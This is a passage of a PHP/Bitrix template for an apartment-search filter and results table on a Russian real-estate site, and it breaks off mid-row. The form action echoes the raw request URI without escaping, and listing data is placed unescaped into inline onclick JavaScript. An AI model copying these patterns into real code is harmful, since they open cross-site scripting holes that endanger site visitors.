<?if (!defined("B_PROLOG_INCLUDED") || B_PROLOG_INCLUDED !== true) die();
/** @var array $arParams */
/** @var array $arResult */
/** @global CMain $APPLICATION */
/** @global CUser $USER */
/** @global CDatabase $DB */
/** @var CBitrixComponentTemplate $this */
/** @var string $templateName */
/** @var string $templateFile */
/** @var string $templateFolder */
/** @var string $componentPath */
/** @var CBitrixComponent $component */
$this->setFrameMode(true);
$templateData = array(
    'TEMPLATE_THEME' => $this->GetFolder() . '/themes/' . $arParams['TEMPLATE_THEME'] . '/colors.css',
    'TEMPLATE_CLASS' => 'bx_' . $arParams['TEMPLATE_THEME']
);
?>

<? // Filter Remote Control
unset($arResult["ITEMS"][3]);
unset($arResult["ITEMS"][4]);
unset($arResult["ITEMS"][6]);
unset($arResult["ITEMS"][7]);
unset($arResult["ITEMS"][10]);
unset($arResult["ITEMS"][14]);
unset($arResult["ITEMS"][15]);
unset($arResult["ITEMS"][17]);

$METRO_ID = 10;
$REGION_ID = 6;
$BUILDER_ID = 7;

function cmp($a, $b) 
{
    if ($a['flatcostwithdiscounts'] == $b['flatcostwithdiscounts']) {
        return 0;
    }
    return ($a['flatcostwithdiscounts'] < $b['flatcostwithdiscounts']) ? -1 : 1;
}

/*
 * Скрываем цены
 * */
//$arParams["DONT_SHOW_PRICE"] = "Y";

$objList = array();
$lett = null;
$countObjList = 0;
$arSelect = Array("ID", "NAME", "CODE");
$arFilter = Array("IBLOCK_ID" => 1, "ACTIVE" => "Y");
$res = CIBlockElement::GetList(Array("SORT" => "ASC", "NAME" => "ASC"), $arFilter, false, false, $arSelect);
while ($ob = $res->GetNextElement()) {
    $arFields = $ob->GetFields();
    $objList[] = $arFields;
    $countObjList++;
}
?>


<div class="bx_filter <?= $templateData["TEMPLATE_CLASS"] ?> <? if ($arParams["FILTER_VIEW_MODE"] == "horizontal"): ?>bx_horizontal<? endif ?>">
<div class="bx_filter_section">
<div class="bx_filter_title"><? echo GetMessage("CT_BCSF_FILTER_TITLE") ?></div>
<?if ($arResult["DONT_SHOW_FILTER"] == "Y"){
    foreach ($arResult["ITEMS"] as $key => $arItem)
    {
        if ($arItem["DISPLAY_TYPE"] == "A" || $arItem["DISPLAY_TYPE"] == "S"){
            if (!empty($arItem["VALUES"])){
                if ($arItem["VALUES"]["MAX"]["VALUE"] == false){
                    if ($arItem["CODE"] == "STOTAL"){
                        $arResult["ITEMS"][$key]["VALUES"]["MAX"]["VALUE"] = "200";
                    }elseif ($arItem["CODE"] == "SKITCHEN"){
                        $arResult["ITEMS"][$key]["VALUES"]["MAX"]["VALUE"] = "40";
                    }elseif ($arItem["CODE"] == "FLATCOST"){
                        $arResult["ITEMS"][$key]["VALUES"]["MAX"]["VALUE"] = "15000000";
                    }
                }
                if ($arItem["VALUES"]["MIN"]["VALUE"] == false){
                    if ($arItem["CODE"] == "STOTAL"){
                        $arResult["ITEMS"][$key]["VALUES"]["MIN"]["VALUE"] = "20";
                    }elseif ($arItem["CODE"] == "SKITCHEN"){
                        $arResult["ITEMS"][$key]["VALUES"]["MIN"]["VALUE"] = "1";
                    }elseif ($arItem["CODE"] == "FLATCOST"){
                        $arResult["ITEMS"][$key]["VALUES"]["MIN"]["VALUE"] = "1000000";
                    }
                }
            }
        }
    }

}


?>
<form name="<? echo $arResult["FILTER_NAME"] . "_form" ?>" action="<?php echo $_SERVER['REQUEST_URI'];?>" method="get" class="smartfilter" style="padding-top: 37px;">


    <?


    //not prices
    foreach ($arResult["ITEMS"] as $key => $arItem)
    {
        if ($arItem["CODE"] != "ROOM_NUM") continue;
    if (
        empty($arItem["VALUES"])
        || isset($arItem["PRICE"])
    )
        continue;

    if (
        $arItem["DISPLAY_TYPE"] == "A"
        && (
            !$arItem["VALUES"]["MIN"]["VALUE"]
            || !$arItem["VALUES"]["MAX"]["VALUE"]
            || $arItem["VALUES"]["MIN"]["VALUE"] == $arItem["VALUES"]["MAX"]["VALUE"]
        )
    )
        continue;

    ?>
    <? if ($arItem["CODE"] == "ROOM_NUM"){ ?>
<div class="filter_boxes first inline">

<? } ?>

    <?
if ($arResult["DONT_SHOW_FILTER"] != "Y"){
     if ($arItem["CODE"] == "BUILDING"){ ?>
</div>
<div class="filter_boxes second inline"><? }
}else{
        if ($arItem["CODE"] == "SKITCHEN"){ ?>
</div>
<div class="filter_boxes second inline"><? } 
}
 ?>
    <? if ($arItem["CODE"] == "FLATCOST"){ ?>

</div>
<div class="filter_boxes third inline"><? } ?>
<div class="bx_filter_parameters_box <?= $arItem["CODE"] ?>">
<span class="bx_filter_container_modef"></span>

<div class="bx_filter_parameters_box_title"><?= $arItem["NAME"] ?></div>
<div class="bx_filter_block">
<div class="bx_filter_parameters_box_container">
<?
$arCur = current($arItem["VALUES"]);
switch ($arItem["DISPLAY_TYPE"]) {
    case "A"://NUMBERS_WITH_SLIDER

        ?>
        <div class="bx_filter_parameters_box_container_block">
            <input
                class="min-price"
                type="hidden"
                name="<? echo $arItem["VALUES"]["MIN"]["CONTROL_NAME"] ?>"
                id="<? echo $arItem["VALUES"]["MIN"]["CONTROL_ID"] ?>"
                value="<? echo $arItem["VALUES"]["MIN"]["HTML_VALUE"] ?>"
                size="5"
                onkeyup="smartFilter.keyup(this)"
                />
            <input
                class="max-price"
                type="hidden"
                name="<? echo $arItem["VALUES"]["MAX"]["CONTROL_NAME"] ?>"
                id="<? echo $arItem["VALUES"]["MAX"]["CONTROL_ID"] ?>"
                value="<? echo $arItem["VALUES"]["MAX"]["HTML_VALUE"] ?>"
                size="5"
                onkeyup="smartFilter.keyup(this);"
                />

            <div class="bx_ui_slider_track" id="drag_track_<?= $key ?>">
                <div class="bx_ui_slider_pricebar_VD" style="left: 0;right: 0;" id="colorUnavailableActive_<?= $key ?>"></div>
                <div class="bx_ui_slider_pricebar_VN" style="left: 0;right: 0;" id="colorAvailableInactive_<?= $key ?>"></div>
                <div class="bx_ui_slider_pricebar_V" style="left: 0;right: 0;" id="colorAvailableActive_<?= $key ?>"></div>
                <div class="bx_ui_slider_range" id="drag_tracker_<?= $key ?>" style="left: 0;right: 0;">
                    <a class="bx_ui_slider_handle left" style="left:0;" href="javascript:void(0)" id="left_slider_<?= $key ?>"></a>
                    <a class="bx_ui_slider_handle right" style="right:0;" href="javascript:void(0)" id="right_slider_<?= $key ?>"></a>
                </div>
            </div>
            <?
            if (!empty($arItem["VALUES"]["MIN"]["HTML_VALUE"])){
                $value1 = $arItem["VALUES"]["MIN"]["HTML_VALUE"];
            }else{
                $value1 = $arItem["VALUES"]["MIN"]["VALUE"];
            }
            if (!empty($arItem["VALUES"]["MAX"]["HTML_VALUE"])){
                $value2 = $arItem["VALUES"]["MAX"]["HTML_VALUE"];
            }else{
                $value2 = $arItem["VALUES"]["MAX"]["VALUE"];
            }

            if ($arItem["CODE"] == "FLATCOST"){
                $resVal1 = ($value1 > 700000 ? round(($value1 / 1000000), 1) : number_format($value1, 1, ',', ' '));
                $resVal2 = ($value2 > 700000 ? round(($value2 / 1000000), 1) : number_format($value2, 1, ',', ' ') );
            }else{
                $resVal1 = $value1;
                $resVal2 = $value2;
            }
            ?>
            <div class="show_res_holder">
                <div class="inline min" id="show_<? echo $arItem["VALUES"]["MIN"]["CONTROL_ID"] ?>" class="">
                    <?= $resVal1; ?>
                </div>
                <div class="inline max" id="show_<? echo $arItem["VALUES"]["MAX"]["CONTROL_ID"] ?>" class="">
                    <?= $resVal2; ?>
                </div>
            </div>
        </div>
    <?
    $arJsParams = array(
        "leftSlider" => 'left_slider_' . $key,
        "rightSlider" => 'right_slider_' . $key,
        "tracker" => "drag_tracker_" . $key,
        "trackerWrap" => "drag_track_" . $key,
        "minInputId" => $arItem["VALUES"]["MIN"]["CONTROL_ID"],
        "maxInputId" => $arItem["VALUES"]["MAX"]["CONTROL_ID"],
        "minPrice" => $arItem["VALUES"]["MIN"]["VALUE"],
        "maxPrice" => $arItem["VALUES"]["MAX"]["VALUE"],
        "curMinPrice" => $arItem["VALUES"]["MIN"]["HTML_VALUE"],
        "curMaxPrice" => $arItem["VALUES"]["MAX"]["HTML_VALUE"],
        "fltMinPrice" => intval($arItem["VALUES"]["MIN"]["FILTERED_VALUE"]) ? $arItem["VALUES"]["MIN"]["FILTERED_VALUE"] : $arItem["VALUES"]["MIN"]["VALUE"],
        "fltMaxPrice" => intval($arItem["VALUES"]["MAX"]["FILTERED_VALUE"]) ? $arItem["VALUES"]["MAX"]["FILTERED_VALUE"] : $arItem["VALUES"]["MAX"]["VALUE"],
        "precision" => 0,
        "colorUnavailableActive" => 'colorUnavailableActive_' . $key,
        "colorAvailableActive" => 'colorAvailableActive_' . $key,
        "colorAvailableInactive" => 'colorAvailableInactive_' . $key,
    );
    ?>
        <script type="text/javascript">
            BX.ready(function () {
                window['trackBar<?=$key?>'] = new BX.Iblock.SmartFilter(<?=CUtil::PhpToJSObject($arJsParams)?>);
            });
        </script>
        <?
        break;
    case "B"://NUMBERS
        ?>
        <div class="bx_filter_parameters_box_container_block">
            <div class="bx_filter_input_container">
                <input
                    class="min-price"
                    type="text"
                    name="<? echo $arItem["VALUES"]["MIN"]["CONTROL_NAME"] ?>"
                    id="<? echo $arItem["VALUES"]["MIN"]["CONTROL_ID"] ?>"
                    value="<? echo $arItem["VALUES"]["MIN"]["HTML_VALUE"] ?>"
                    size="5"
                    onkeyup="smartFilter.keyup(this)"
                    />
            </div>
        </div>
        <div class="bx_filter_parameters_box_container_block">
            <div class="bx_filter_input_container">
                <input
                    class="max-price"
                    type="text"
                    name="<? echo $arItem["VALUES"]["MAX"]["CONTROL_NAME"] ?>"
                    id="<? echo $arItem["VALUES"]["MAX"]["CONTROL_ID"] ?>"
                    value="<? echo $arItem["VALUES"]["MAX"]["HTML_VALUE"] ?>"
                    size="5"
                    onkeyup="smartFilter.keyup(this)"
                    />
            </div>
        </div>
        <?
        break;
    case "G"://CHECKBOXES_WITH_PICTURES
        ?>
        <? foreach ($arItem["VALUES"] as $val => $ar): ?>
        <input
            style="display: none"
            type="checkbox"
            name="<?= $ar["CONTROL_NAME"] ?>"
            id="<?= $ar["CONTROL_ID"] ?>"
            value="<?= $ar["HTML_VALUE"] ?>"
            <? echo $ar["CHECKED"] ? 'checked="checked"' : '' ?>
            />
        <?
        $class = "";
        if ($ar["CHECKED"])
            $class .= " active";
        if ($ar["DISABLED"])
            $class .= " disabled";
        ?>
        <label for="<?= $ar["CONTROL_ID"] ?>" data-role="label_<?= $ar["CONTROL_ID"] ?>" class="bx_filter_param_label dib<?= $class ?>" onclick="smartFilter.keyup(BX('<?= CUtil::JSEscape($ar["CONTROL_ID"]) ?>')); BX.toggleClass(this, 'active');">
										<span class="bx_filter_param_btn bx_color_sl">
											<? if (isset($ar["FILE"]) && !empty($ar["FILE"]["SRC"])): ?>
                                                <span class="bx_filter_btn_color_icon" style="background-image:url('<?= $ar["FILE"]["SRC"] ?>');"></span>
                                            <? endif ?>
										</span>
        </label>
    <? endforeach ?>
        <?
        break;
    case "H"://CHECKBOXES_WITH_PICTURES_AND_LABELS
        ?>
        <? foreach ($arItem["VALUES"] as $val => $ar): ?>
        <input
            style="display: none"
            type="checkbox"
            name="<?= $ar["CONTROL_NAME"] ?>"
            id="<?= $ar["CONTROL_ID"] ?>"
            value="<?= $ar["HTML_VALUE"] ?>"
            <? echo $ar["CHECKED"] ? 'checked="checked"' : '' ?>
            />
        <?
        $class = "";
        if ($ar["CHECKED"])
            $class .= " active";
        if ($ar["DISABLED"])
            $class .= " disabled";
        ?>
        <label for="<?= $ar["CONTROL_ID"] ?>" data-role="label_<?= $ar["CONTROL_ID"] ?>" class="bx_filter_param_label<?= $class ?>" onclick="smartFilter.keyup(BX('<?= CUtil::JSEscape($ar["CONTROL_ID"]) ?>')); BX.toggleClass(this, 'active');">
										<span class="bx_filter_param_btn bx_color_sl">
											<? if (isset($ar["FILE"]) && !empty($ar["FILE"]["SRC"])): ?>
                                                <span class="bx_filter_btn_color_icon" style="background-image:url('<?= $ar["FILE"]["SRC"] ?>');"></span>
                                            <? endif ?>
										</span>
										<span class="bx_filter_param_text">
											<?= $ar["VALUE"] ?>
										</span>
        </label>
    <? endforeach ?>
        <?
        break;
    case "P"://DROPDOWN
        $checkedItemExist = false;
        ?>
        <div class="bx_filter_select_container">
            <div class="bx_filter_select_block" onclick="smartFilter.showDropDownPopup(this, '<?= CUtil::JSEscape($key) ?>')">
                <div class="bx_filter_select_text" data-role="currentOption">
                    <?
                    foreach ($arItem["VALUES"] as $val => $ar) {
                        if ($ar["CHECKED"]) {
                            echo $ar["VALUE"];
                            $checkedItemExist = true;
                        }
                    }
                    if (!$checkedItemExist) {
                        echo GetMessage("CT_BCSF_FILTER_ALL");
                    }
                    ?>
                </div>
                <div class="bx_filter_select_arrow"></div>
                <input
                    style="display: none"
                    type="radio"
                    name="<?= $arCur["CONTROL_NAME_ALT"] ?>"
                    id="<? echo "all_" . $arCur["CONTROL_ID"] ?>"
                    value=""
                    />
                <? foreach ($arItem["VALUES"] as $val => $ar): ?>
                    <input
                        style="display: none"
                        type="radio"
                        name="<?= $ar["CONTROL_NAME_ALT"] ?>"
                        id="<?= $ar["CONTROL_ID"] ?>"
                        value="<? echo $ar["HTML_VALUE_ALT"] ?>"
                        <? echo $ar["CHECKED"] ? 'checked="checked"' : '' ?>
                        />
                <? endforeach ?>
                <div class="bx_filter_select_popup" data-role="dropdownContent" style="display: none;">
                    <ul>
                        <li>
                            <label for="<?= "all_" . $arCur["CONTROL_ID"] ?>" class="bx_filter_param_label" data-role="label_<?= "all_" . $arCur["CONTROL_ID"] ?>" onclick="smartFilter.selectDropDownItem(this, '<?= CUtil::JSEscape("all_" . $arCur["CONTROL_ID"]) ?>')">
                                <? echo GetMessage("CT_BCSF_FILTER_ALL"); ?>
                            </label>
                        </li>
                        <?
                        foreach ($arItem["VALUES"] as $val => $ar):
                            $class = "";
                            if ($ar["CHECKED"])
                                $class .= " selected";
                            if ($ar["DISABLED"])
                                $class .= " disabled";
                            ?>
                            <li>
                                <label for="<?= $ar["CONTROL_ID"] ?>" class="bx_filter_param_label<?= $class ?>" data-role="label_<?= $ar["CONTROL_ID"] ?>" onclick="smartFilter.selectDropDownItem(this, '<?= CUtil::JSEscape($ar["CONTROL_ID"]) ?>')"><?= $ar["VALUE"] ?></label>
                            </li>
                        <? endforeach ?>
                    </ul>
                </div>
            </div>
        </div>
        <?
        break;
    case "K"://RADIO_BUTTONS
        ?>
        <label class="bx_filter_param_label" for="<? echo "all_" . $arCur["CONTROL_ID"] ?>">
									<span class="bx_filter_input_checkbox">
										<input
                                            type="radio"
                                            value=""
                                            name="<? echo $arCur["CONTROL_NAME_ALT"] ?>"
                                            id="<? echo "all_" . $arCur["CONTROL_ID"] ?>"
                                            onclick="smartFilter.click(this)"
                                            />
										<span class="bx_filter_param_text"><? echo GetMessage("CT_BCSF_FILTER_ALL"); ?></span>
									</span>
        </label>
        <? foreach ($arItem["VALUES"] as $val => $ar): ?>
        <label data-role="label_<?= $ar["CONTROL_ID"] ?>" class="bx_filter_param_label" for="<? echo $ar["CONTROL_ID"] ?>">
										<span class="bx_filter_input_checkbox <? echo $ar["DISABLED"] ? 'disabled' : '' ?>">
											<input
                                                type="radio"
                                                value="<? echo $ar["HTML_VALUE_ALT"] ?>"
                                                name="<? echo $ar["CONTROL_NAME_ALT"] ?>"
                                                id="<? echo $ar["CONTROL_ID"] ?>"
                                                <? echo $ar["CHECKED"] ? 'checked="checked"' : '' ?>
                                                onclick="smartFilter.click(this)"
                                                />
											<span class="bx_filter_param_text"><? echo $ar["VALUE"]; ?></span>
										</span>
        </label>
    <? endforeach; ?>
        <?
        break;
    default://CHECKBOXES
        ?>
        <?foreach ($arItem["VALUES"] as $val => $ar):?><?
            ?><label data-role="label_<?= $ar["CONTROL_ID"] ?>" class="bx_filter_param_label <? echo $ar["DISABLED"] ? 'disabled' : '' ?>" for="<? echo $ar["CONTROL_ID"] ?>">
            <span class="bx_filter_input_checkbox">
											<input
                                                type="checkbox"
                                                value="<? echo $ar["HTML_VALUE"] ?>"
                                                name="<? echo $ar["CONTROL_NAME"] ?>"
                                                id="<? echo $ar["CONTROL_ID"] ?>"
                                                <? echo $ar["CHECKED"] ? 'checked="checked"' : '' ?>
                                                onclick="smartFilter.click(this)"
                                                />
											<span class="bx_filter_param_text"><? echo $ar["VALUE"]; ?></span>
										</span>
            </label><?
            ?><?endforeach;?>
        <?
}
?>
</div>
<div class="clb"></div>
</div>
</div>
<?
}
?>
<div class="clb"></div>

</div>
    <div class="bx_filter_button_box active">
        <div class="bx_filter_block">
            <div class="bx_filter_parameters_box_container">
                <input class="bx_filter_search_button" type="submit" id="set_filter" name="set_filter" value="<?= GetMessage("CT_BCSF_SET_FILTER") ?>"/>
            </div>
        </div>
    </div>
    <div style="clear:both;"></div>
    <input type='hidden' value='1' name='page' id='pageNumber' />
    <input type='hidden' value='Показать варианты' name='set_filter' id='pageNumber' />
</form>


<?
if (isset($_REQUEST["page"]) && !empty($_REQUEST["page"])){
    $startElement= ($_REQUEST["page"] - 1)*59+1;
    if ($_REQUEST["page"] == $arResult["TOTAL_COUNT_PAGE"]){
        $finishElement = $arResult["COUNT_FINDED"]; 
    } else {
        $finishElement = $startElement + 59;
    }
}else{
   $startElement = 1;
   $finishElement = 60;
}
?>
<div class="show_tablehead" style="display:none;">
        <table style="width: 1056px; margin-left: -38px;" class="summCharTable">
            <tr class="boldText titleTable">
                <th width="38"></th>
                <th width="65">ID</th>
                <th>Корпус</th>
                <th>Комнаты</th>
                <th>Срок сдачи</th>
                <th>Этаж</th>
                <th>Очередь</th>
                <th>S общая</th>
                <th>S жилая</th>
                <th>S кухни</th>
                <?/*<th>Базовая цена</th>*/?>
                <th><?= ($arParams["DONT_SHOW_PRICE"] == "Y")?"Стоимость(<span class=\"vchar\" id=\"char-node\">&#8381;</span>)":"Стоимость со скидкой"?></th>
                <?= ($arParams["DONT_SHOW_PRICE"] == "Y")?"<th style=\"color: red;\">Стоимость со скидкой</th> ":""?>
                <th>Планировка</th>
                <th></th>
                <th width="38"></th>
            </tr>
        </table>
</div>


<?php
usort($arResult["OBJECT"], "cmp");
echo "<div id='table111' style='background-color:#FFFFFF;margin-left: -38px; width: 980px; padding: 0 38px;'>";
if (!empty($arResult["OBJECT"])){
    if ($arParams["TYPE_HTML"] == "price") {

        ?>

        <table style="width: 1056px; margin-left: -38px;" class="summCharTable">
            <tr class="boldText titleTable">
                <th width="38"></th>
                <th>ID</th>
                <th>Корпус</th>
                <th>Комнаты</th>
                <th>Срок сдачи</th>
                <th>Этаж</th>
                <th>Очередь</th>
                <th>S общая</th>
                <th>S жилая</th>
                <th>S кухни</th>
                <?/*<th>Базовая цена</th>*/?>
                <?/*<th>Стоимость со скидкой</th>*/?>
                <th><?= ($arParams["DONT_SHOW_PRICE"] == "Y")?"Стоимость(<span class=\"vchar\" id=\"char-node\">&#8381;</span>)":"Стоимость со скидкой"?></th>
                <?= ($arParams["DONT_SHOW_PRICE"] == "Y")?"<th style=\"color: red;\">Стоимость со скидкой</th> ":""?>
                <th>Планировка</th>
                <th></th>
                <th width="38"></th>
            </tr>
            <?foreach ($arResult["OBJECT"] as $key => $apartment) {
                if ((($key + 1) < $startElement) || (($key + 1) > $finishElement)) {
                    continue;
                }

                ?>
                <tr id="Q_<?= $apartment['id'] ?>">
                    <td></td>
                    <td onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?=$apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= ($arParams["DONT_SHOW_PRICE"] == "N")?"":number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>'});"><?= $apartment['id'] ?></td>
                    <td onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?=$apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= ($arParams["DONT_SHOW_PRICE"] == "N")?"":number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>'});"><?= $apartment['corp'] ?></td>
                    <td onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?=$apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= ($arParams["DONT_SHOW_PRICE"] == "N")?"":number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>'});"><?= (empty($apartment['roomtype']))?$apartment['rooms']:$apartment['roomtype'] ?></td>
                    <td onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?=$apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= ($arParams["DONT_SHOW_PRICE"] == "N")?"":number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>'});"><?= $apartment['endingperiod'] ?></td>
                    <td onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?=$apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= ($arParams["DONT_SHOW_PRICE"] == "N")?"":number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>'});"><?= $apartment['flatfloor']; ?></td>
                    <td onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?=$apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= ($arParams["DONT_SHOW_PRICE"] == "N")?"":number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>'});"><?= $apartment['line']; ?></td>
                    <td onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?=$apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= ($arParams["DONT_SHOW_PRICE"] == "N")?"":number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>'});"><?= $apartment['stotal'] ?></td>
                    <td onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?=$apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= ($arParams["DONT_SHOW_PRICE"] == "N")?"":number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>'});"><?= $apartment['sroom'] ?></td>
                    <td onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?=$apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= ($arParams["DONT_SHOW_PRICE"] == "N")?"":number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>'});"><?= $apartment['skitchen'] ?></td>
                    <?if ($arParams["DONT_SHOW_PRICE"] == "N"){?>
                    <?/*<td><a data-who="footer_feedback" class="showIt">узнать</a></td>*/?>
                    <td><a data-who="price_plan" class="showIt">Узнать цену</a></td>
                    <?} else{?>
                    <?/*<td onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?=$apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= number_format($apartment['baseflatcost'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>'});">от <?=number_format($apartment['baseflatcost'], 0, ',', ' ')?></td>*/?>
